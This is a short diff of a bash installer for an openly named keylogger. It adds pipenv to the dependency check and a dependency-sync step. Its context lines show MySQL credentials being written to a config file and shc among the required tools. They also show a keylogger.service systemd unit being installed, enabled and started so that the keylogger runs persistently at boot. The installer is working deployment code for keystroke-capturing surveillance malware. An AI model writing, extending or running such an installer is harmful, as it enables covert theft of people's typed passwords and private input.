@@ -1,8 +1,9 @@
 #!/bin/bash
 
+# Check depencencies
 # from https://stackoverflow.com/a/52552095
 echo -n "Checking dependencies... "
-for name in python3 mysql shc
+for name in python3 mysql shc pipenv
 do
   [[ $(which $name 2>/dev/null) ]] || { echo -en "\n$name needs to be installed.";deps=1; }
 done
@@ -40,6 +41,9 @@ echo "MYSQL_CONFIG = {\"user\": \"$user\", \"password\": \"$password\", \"host\"
 # Set directory of libs
 echo "PYTHONPATH='lib/'" >> .env
 
+# Install python dependencies
+pipenv --quiet sync;
+
 # Config autostart
 path="${PWD}/bin/runner.py";
 echo "#!/bin/sh" > start_keylogger.sh;
@@ -53,4 +57,4 @@ sudo mv keylogger.service /etc/systemd/system/;
 systemctl enable keylogger.service;
 systemctl start keylogger.service;
 
-echo "Keylogger status: $(systemctl is-active keylogger.service)";
+echo "\nKeylogger status: $(systemctl is-active keylogger.service)";
